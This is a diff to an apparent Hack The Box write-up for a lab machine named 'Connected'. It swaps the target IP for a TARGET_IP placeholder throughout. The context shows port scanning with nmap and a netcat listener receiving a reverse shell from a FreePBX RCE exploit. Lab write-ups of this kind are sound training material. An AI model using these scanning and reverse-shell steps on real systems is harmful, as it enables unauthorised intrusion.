@@ -73,14 +73,14 @@ Verify that the target machine is up and reachable by performing an ICMP ping te
 
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
-└─$ ping -c 4 10.129.28.134          
-PING 10.129.28.134 (10.129.28.134) 56(84) bytes of data.
-64 bytes from 10.129.28.134: icmp_seq=1 ttl=63 time=247 ms
-64 bytes from 10.129.28.134: icmp_seq=2 ttl=63 time=213 ms
-64 bytes from 10.129.28.134: icmp_seq=3 ttl=63 time=212 ms
-64 bytes from 10.129.28.134: icmp_seq=4 ttl=63 time=213 ms
+└─$ ping -c 4 TARGET_IP          
+PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
+64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=247 ms
+64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=213 ms
+64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=212 ms
+64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=213 ms
 
---- 10.129.28.134 ping statistics ---
+--- TARGET_IP ping statistics ---
 4 packets transmitted, 4 received, 0% packet loss, time 3005ms
 rtt min/avg/max/mdev = 211.856/221.311/246.876/14.771 ms
 ```
@@ -126,9 +126,9 @@ Before we can attack a system, we need to find out what "doors" are open. Doors 
 
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
-└─$ nmap -p- --min-rate 5000 -Pn 10.129.28.134
+└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 09:58 -0400
-Nmap scan report for 10.129.28.134
+Nmap scan report for TARGET_IP
 Host is up (0.44s latency).
 Not shown: 65532 filtered tcp ports (no-response)
 PORT    STATE SERVICE
@@ -161,9 +161,9 @@ Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds
 
 ```shell
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
-└─$ nmap -A -p 22,80,443 10.129.28.134        
+└─$ nmap -A -p 22,80,443 TARGET_IP        
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 10:00 -0400
-Nmap scan report for 10.129.28.134
+Nmap scan report for TARGET_IP
 Host is up (0.22s latency).
 
 PORT    STATE SERVICE  VERSION
@@ -193,7 +193,7 @@ Network Distance: 2 hops
 TRACEROUTE (using port 443/tcp)
 HOP RTT       ADDRESS
 1   221.34 ms 10.10.14.1
-2   222.89 ms 10.129.28.134
+2   222.89 ms TARGET_IP
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 52.11 seconds
@@ -223,7 +223,7 @@ Nmap done: 1 IP address (1 host up) scanned in 52.11 seconds
 
 #### 2.2.1 Update Hosts File
 
-**Command:** `echo "10.129.28.134  connected.htb" | sudo tee -a /etc/hosts`
+**Command:** `echo "TARGET_IP  connected.htb" | sudo tee -a /etc/hosts`
 
 **Breakdown:**
 
@@ -704,7 +704,7 @@ Check the listener terminal for the callback:
 ┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.10.14.85] from (UNKNOWN) [10.129.28.134] 33588
+connect to [10.10.14.85] from (UNKNOWN) [TARGET_IP] 33588
 bash: no job control in this shell
 ______                   ______ ______ __   __
 |  ___|                  | ___ \| ___ \\ \ / /
@@ -719,7 +719,7 @@ Current Network Configuration
 +-----------+-------------------+---------------------------+
 | Interface | MAC Address       | IP Addresses              |
 +-----------+-------------------+---------------------------+
-| eth0      | A2:DE:AD:9B:7D:94 | 10.129.28.134             |
+| eth0      | A2:DE:AD:9B:7D:94 | TARGET_IP             |
 |           |                   | fe80::82bd:1bcb:a990:dd3b |
 +-----------+-------------------+---------------------------+
 
